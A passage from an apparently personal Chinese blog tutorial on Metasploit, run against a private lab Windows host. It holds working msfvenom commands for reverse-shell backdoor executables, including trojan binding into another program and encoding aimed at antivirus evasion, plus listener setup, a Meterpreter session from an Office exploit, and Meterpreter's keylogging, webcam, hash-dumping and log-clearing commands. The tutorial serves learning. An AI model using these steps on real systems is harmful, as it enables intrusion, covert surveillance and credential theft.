class="line"></span><br><span class="line">  Id  Name  Type                     Information                Connection</span><br><span class="line">  --  ----  ----                     -----------                ----------</span><br><span class="line">  2         meterpreter x86/windows  admin-PC\admin @ ADMIN-PC  192.168.189.141:4444 -&gt; 192.168.189.25</span><br><span class="line">                                                                0:49479 (192.168.189.250)</span><br><span class="line"></span><br><span class="line">msf6 exploit(icon_tools/office_cve_2017_11882) &gt; sessions -i 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结流程：利用github上的rb脚本放到msf的exploit攻击模块上，然后利用其生成一个上线脚本，然后利用python脚本生成利用office远程命令执行漏洞的doc文档，当对方自主点击word文档时自动执行上线命令。</p>
<h2 id="6，msfvenom"><a href="#6，msfvenom" class="headerlink" title="6，msfvenom"></a>6，msfvenom</h2><p>​		可以利用msfvenom生成ShellCode，形式多样，从多种编程语言到多平台，再到多种文件格式。简单来说就是生成”木马后门”。和msf配套的工具</p>
<h4 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h4><p><code>msfvenom -h</code>:一定要学会看文档：</p>
<h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><p>&lt;1&gt;<strong>生成木马后门常用命令</strong>：</p>
<p><code>/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</code></p>
<p>我生成如下木马：这是一个简单的反弹命令木马</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.189.141 lport=4444 -f exe -o payload.exe</code></p>
<p>上传至win7主机，使其点击后反弹shell到我的我的主机：</p>
<p><strong>补充：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">生成木马后门命令：</span><br><span class="line">Example:</span><br><span class="line">/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.189.141 lport=4444 -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.189.141 lport=4444 -x wecheat.exe -k -f exe -o wecheat.exe</span><br><span class="line">解释：</span><br><span class="line">-x ：把木马捆绑到另外一个exe文件上去</span><br><span class="line">-k：保持原来这个exe文件的功能</span><br><span class="line">-f：格式是exe</span><br><span class="line">-o：输出这样一个exe文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.189.141 lport=4444 -i 12 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">-i：进行12编码</span><br><span class="line">-e：编码器</span><br><span class="line">尝试进行木马免杀</span><br></pre></td></tr></table></figure>



<p>&lt;2&gt;<strong>msf开启监听</strong>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search exploit/multi/handler</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash"> Name                                                 Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                 ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence</span><br><span class="line">   1  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner</span><br><span class="line">   2  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence</span><br><span class="line">   3  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation</span><br><span class="line">   4  exploit/multi/handler                                                 manual     No     Generic Payload Handler</span><br><span class="line">   5  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution</span><br><span class="line">   6  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal</span><br><span class="line">   7  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/local/yum_package_manager_persistence</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 4</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进入handler：<code>show options</code>一手：</p>
<p><img src="/posts/4a17b156/%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20240730113228936.png" alt="image-20240730113228936"></p>
<p>注意：我当时生成木马时，已经选择了payload：<code>windows/meterpreter/reverse_tcp</code>所以在此需要将payload重新建立：并设置好主机ip等：</p>
<p>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.189.141</span><br><span class="line">设置完毕，接下来就等待对放触发上线</span><br></pre></td></tr></table></figure>

<h2 id="7，meterpreter"><a href="#7，meterpreter" class="headerlink" title="7，meterpreter"></a>7，meterpreter</h2><ul>
<li>木马远控</li>
<li>C2（Control and Command）</li>
</ul>
<h4 id="技术优势："><a href="#技术优势：" class="headerlink" title="技术优势："></a>技术优势：</h4><h5 id="平台通用性："><a href="#平台通用性：" class="headerlink" title="平台通用性："></a>平台通用性：</h5><p>​		Metasploit 提供了各种主流操作系统和平台上的Meterpreter 版本，包括Windows，Linux，BSD 系统，并且同时支持x86和x64平台。另外，Meterpreter 还提供了基于Java和PHP 的实现，以应用在各种不同的环境中。</p>
<h5 id="纯内存工作模式："><a href="#纯内存工作模式：" class="headerlink" title="纯内存工作模式："></a>纯内存工作模式：</h5><p>​		执行漏洞渗透攻击的时候，会直接装载Meterpreter 的动态链接库到目标系统进程的内存空间。而不是先将Meterpreter 上传到磁盘，然后调用 Loadlibrary加载动态链接库来启动Meterpreter。这种纯内存工作模式的好处就是启动隐蔽，很难被杀毒软件监测到。此外，也不需要访问目标主机的磁盘，基本不会留下入侵的证据。虽然现在的内存分析与提取技术能事后捕获到Meterpreter 的蛛丝马迹，但这种技术不仅难度大，而且成功率低。并且这种模式不会创建新的进程。</p>
<h5 id="灵活且加密的通信协议："><a href="#灵活且加密的通信协议：" class="headerlink" title="灵活且加密的通信协议："></a>灵活且加密的通信协议：</h5><p>​		Meterpreter还提供了灵活加密的客户端服务通信协议，能够对网络传输进行加密，同时这种通信技术支持灵活的功能扩展。</p>
<p>​		Meterpreter的网络通信协议采用TLV数据封住格式。</p>
<h5 id="易于扩展："><a href="#易于扩展：" class="headerlink" title="易于扩展："></a>易于扩展：</h5><p>​		Meterpreter在功能上来说不是一般的shellcode能比拟的，但如果用户需要一些特殊或者定制的功能，也可以轻易的在Meterpreter中添加扩展或插件来实现。</p>
<h4 id="常用基本命令："><a href="#常用基本命令：" class="headerlink" title="常用基本命令："></a>常用基本命令：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ?</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    background    Backgrounds the current session</span><br><span class="line">    bg            Alias for background</span><br><span class="line">    bgkill        Kills a background meterpreter script</span><br><span class="line">    bglist        Lists running background scripts</span><br><span class="line">    bgrun         Executes a meterpreter script as a background thread</span><br><span class="line">    channel       Displays information or control active channels</span><br><span class="line">    close         Closes a channel</span><br><span class="line">    detach        Detach the meterpreter session (for http/https)</span><br><span class="line">    disable_unic  Disables encoding of unicode strings</span><br><span class="line">    ode_encoding</span><br><span class="line">    enable_unico  Enables encoding of unicode strings</span><br><span class="line">    de_encoding</span><br><span class="line">    exit          Terminate the meterpreter session</span><br><span class="line">    get_timeouts  Get the current session timeout values</span><br><span class="line">    guid          Get the session GUID</span><br><span class="line">    help          Help menu</span><br><span class="line">    info          Displays information about a Post module</span><br><span class="line">    irb           Open an interactive Ruby shell on the current session</span><br><span class="line">    load          Load one or more meterpreter extensions</span><br><span class="line">    machine_id    Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate       Migrate the server to another process</span><br><span class="line">    pivot         Manage pivot listeners</span><br><span class="line">    pry           Open the Pry debugger on the current session</span><br><span class="line">    quit          Terminate the meterpreter session</span><br><span class="line">    read          Reads data from a channel</span><br><span class="line">    resource      Run the commands stored in a file</span><br><span class="line">    run           Executes a meterpreter script or Post module</span><br><span class="line">    secure        (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions      Quickly switch to another session</span><br><span class="line">    set_timeouts  Set the current session timeout values</span><br><span class="line">    sleep         Force Meterpreter to go quiet, then re-establish session</span><br><span class="line">    ssl_verify    Modify the SSL certificate verification setting</span><br><span class="line">    transport     Manage the transport mechanisms</span><br><span class="line">    use           Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid          Get the UUID for the current session</span><br><span class="line">    write         Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    checksum      Retrieve the checksum of a file</span><br><span class="line">    cp            Copy source to destination</span><br><span class="line">    del           Delete the specified file</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    lcat          Read the contents of a local file to the screen</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lmkdir        Create new directory on local machine</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    pwd           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    search        Search for files</span><br><span class="line">    show_mount    List all mount points/logical drives</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    arp           Display the host ARP cache</span><br><span class="line">    getproxy      Display the current proxy configuration</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    netstat       Display the network connections</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    resolve       Resolve a set of host names on the target</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: System Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    clearev       Clear the event log</span><br><span class="line">    drop_token    Relinquishes any active impersonation token.</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="line">    getsid        Get the SID of the user that the server is running as</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    kill          Terminate a process</span><br><span class="line">    localtime     Displays the target system local date and time</span><br><span class="line">    pgrep         Filter processes by name</span><br><span class="line">    pkill         Terminate processes by name</span><br><span class="line">    ps            List running processes</span><br><span class="line">    reboot        Reboots the remote computer</span><br><span class="line">    reg           Modify and interact with the remote registry</span><br><span class="line">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    shutdown      Shuts down the remote computer</span><br><span class="line">    steal_token   Attempts to steal an impersonation token from the target process</span><br><span class="line">    suspend       Suspends or resumes a list of processes</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: User interface Commands</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    enumdesktops  List all accessible desktops and window stations</span><br><span class="line">    getdesktop    Get the current meterpreter desktop</span><br><span class="line">    idletime      Returns the number of seconds the remote user has been idle</span><br><span class="line">    keyboard_sen  Send keystrokes</span><br><span class="line">    d</span><br><span class="line">    keyevent      Send key events</span><br><span class="line">    keyscan_dump  Dump the keystroke buffer</span><br><span class="line">    keyscan_star  Start capturing keystrokes</span><br><span class="line">    t</span><br><span class="line">    keyscan_stop  Stop capturing keystrokes</span><br><span class="line">    mouse         Send mouse events</span><br><span class="line">    screenshare   Watch the remote user desktop in real time</span><br><span class="line">    screenshot    Grab a screenshot of the interactive desktop</span><br><span class="line">    setdesktop    Change the meterpreters current desktop</span><br><span class="line">    uictl         Control some of the user interface components</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    record_mic    Record audio from the default microphone for X seconds</span><br><span class="line">    webcam_chat   Start a video chat</span><br><span class="line">    webcam_list   List webcams</span><br><span class="line">    webcam_snap   Take a snapshot from the specified webcam</span><br><span class="line">    webcam_strea  Play a video stream from the specified webcam</span><br><span class="line">    m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    getsystem     Attempt to elevate your privilege to that of local system.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Password database Commands</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    hashdump      Dumps the contents of the SAM database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Timestomp Commands</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    timestomp     Manipulate file MACE attributes</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如上就是一些就基本命令。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Iconabc.github.io">icon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://iconabc.github.io/posts/50aa4c3b.html">https://iconabc.github.io/posts/50aa4c3b.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Iconabc.github.io" target="_blank">icon'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/tool/">tool</a></div><div class="post-share"><div class="social-share" data-image="/img/mbc.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/57d5375c.html" title="DC-1,DC-2,DC-3靶场记录--反弹shell"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">DC-1,DC-2,DC-3靶场记录--反弹shell</div></div><div class="info-2"><div class="info-item-1">反弹shell——-dc1，2，3靶场记录 链接持久性问题 内网穿透  为什么要反弹shell？ WebShell...</div></div></div></a><a class="pagination-related" href="/posts/dad5e299.html" title="主动信息收集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">主动信息收集</div></div><div class="info-2"><div class="info-item-1">主动信息收集一，资产收集整理​		在红蓝(黑白)对抗过程中，资产都处于核心地位。攻击方要清楚目标范围，攻击方要尽可能暴露目标资产。防守方要知道自己有多少有价值的资产，包括**IP 地址，网络设备，安全设备，服务器，运行在端口号上的服务和服务器中存储的数据(文件，数据库等)**等。​		为了节省时间和人力，通常采用手工和工具相结合的方式。使用工具，就是将一些机械性的操作自动化实现，用以提高效率。例如，寻找内网 10.4.7.0/24所有在线主机，如果一个一个去ping 来测试主机是否存活(在线)，显然是不合适的。 资产收集整理:  主机发现 端口扫描 指纹识别 …….  1.1 基础知识1.1.1 IP地址分类​		最初设计互联网络时，为了便于寻址以及层次化构造网络，每个P地址包括两个标识码(ID)，即网络ID和主机ID。同一个物理网络上的所有主机都使用同一个网络ID，网络上的一个主机(包括网络上工作站，服务器和路由器等)有一个主机ID 与其对应。IP 地址根据网络ID 的不同分为5 种类型，A 类地址、B 类地址、C类地址、D 类地址和E 类地址。 1.1.2...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/72c8ab20.html" title="tmux使用说明"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-14</div><div class="info-item-2">tmux使用说明</div></div><div class="info-2"><div class="info-item-1">Tmux使用说明：1.tmux会话退出1231. 输入exit 然后 ‘enter’2.ctrl+b，than press ‘x’3.ctrl+d  注意：1，2，3的区别： 1.直接退出tmux窗口 2，3.都是依次关闭tmux会话中的窗口，直到关闭最后一个窗口时，退出tmux窗口 2.前缀键 tmux窗口有大量的快捷键。所有快捷键都要通过前缀键唤起。默认的前缀键是Ctrl+b，即先按下Ctrl+b，快捷键才会生效。  举例来说: 帮助命令的快捷键是Ctrl+b ?。它的用法是，在 Tmux 窗口中，先按下Ctrl+b，再按下?，就会显示帮助信息。 然后，按下ESC 键或q键，就可以退出帮助。 3.会话管理3.1新建会话启动tmux窗口第一个窗口编号是0，第二个窗口编号是1，以此类推。这些窗口对应的会话，就是0号会话，1号会话。 使用编号区分会话的话不太直观，更直观的是给会话取名 1[root@bogon ~]# tmux new -s nws01   3.2分离会话（退出但是后台会话依旧存在）有奇用 在 Tmux 窗口中，按下Ctrl+b d或者输入tmux...</div></div></div></a><a class="pagination-related" href="/posts/93eb49a0.html" title="docker的简单使用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-16</div><div class="info-item-2">docker的简单使用</div></div><div class="info-2"><div class="info-item-1">docker的使用：1，安装docker123sudo apt-get install docker安装docker    123sudo apt install docker-compose运行和定义多容器的docker工具，借助它可以使用yaml配置程序和服务一条命令启动所有服务    123sudo docker version检查docker版本  2，docker的使用123docker-compose pull可以拉取docker-compose.yml或者docker-stack.yml文件中定义的服务关联的镜像    123docker-compose up -d在后台启动容器并使他们保持运行  12345678910111213141516启动docker：sudo service docker start停止docker：sudo service docker stop重启docker：sudo service docker restart    1234567显示docker版本和信息：docker --versiondocker...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/mbc.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">icon</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Iconabc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Iconabc/" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="mailto:2899345299@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">up up</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">Metasploit使用：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%EF%BC%8C%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">1，技术架构如下：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#auxiliary%EF%BC%9A%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.1.</span> <span class="toc-text">auxiliary：辅助模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encoders%EF%BC%9A%E7%BC%96%E7%A0%81%E5%99%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.2.</span> <span class="toc-text">encoders：编码器模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#evasion%EF%BC%9A%E5%85%8D%E6%9D%80%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.3.</span> <span class="toc-text">evasion：免杀模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploits%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.4.</span> <span class="toc-text">exploits：渗透攻击模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nops%EF%BC%9A%E7%A9%BA%E6%8C%87%E4%BB%A4%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.5.</span> <span class="toc-text">nops：空指令模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payloads%EF%BC%9A%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.6.</span> <span class="toc-text">payloads：攻击载荷模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post%EF%BC%9A%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.7.</span> <span class="toc-text">post：后渗透模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%EF%BC%8C%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">2，命令速查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">搜索命令用法示例：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%EF%BC%9A"><span 